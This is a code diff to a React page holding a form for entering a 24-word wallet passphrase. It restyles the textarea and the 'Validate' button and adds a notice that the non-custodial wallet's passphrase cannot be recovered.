@@ -92,7 +92,7 @@ export default function page() {
                   <FormItem>
                     <FormControl>
                       <Textarea
-                        className="resize-none h-52 border-black/60 text-black/60 text-sm font-medium"
+                        className="resize-none h-72 border-black/60 text-black/60 text-lg tracking-widest font-medium"
                         placeholder="Enter your 24-word passphrase here"
                         {...field}
                       />
@@ -107,13 +107,18 @@ export default function page() {
                   </FormItem>
                 )}
               />
-              <div className="flex flex-col items-center gap-5">
+              <div className="flex flex-col items-center gap-5 max-w-xl mx-auto">
                 <button
                   type="submit"
-                  className="min-w-[250px] text-sm px-10 uppercase hover:bg-[#8a348e] hover:border-white/50 transition-all ease-linear duration-200  border-[#8a348e] text-[#8a348e] font-bold hover:text-white py-3.5 rounded-lg border"
+                  className="min-w-[250px] w-full md:w-fit text-sm px-10 uppercase hover:bg-[#8a348e] hover:border-white/50 transition-all ease-linear duration-200  border-[#8a348e] text-[#8a348e] font-bold hover:text-white py-3.5 rounded-lg border"
                 >
-                  Validate with Passphrase
+                  Validate
                 </button>
+                <p className="text-sm">
+                  As a non-custodial wallet, your wallet passphrase is
+                  exclusively accessible only to you. Recovery of passphrase is
+                  currently impossible
+                </p>
               </div>
             </form>
           </Form>
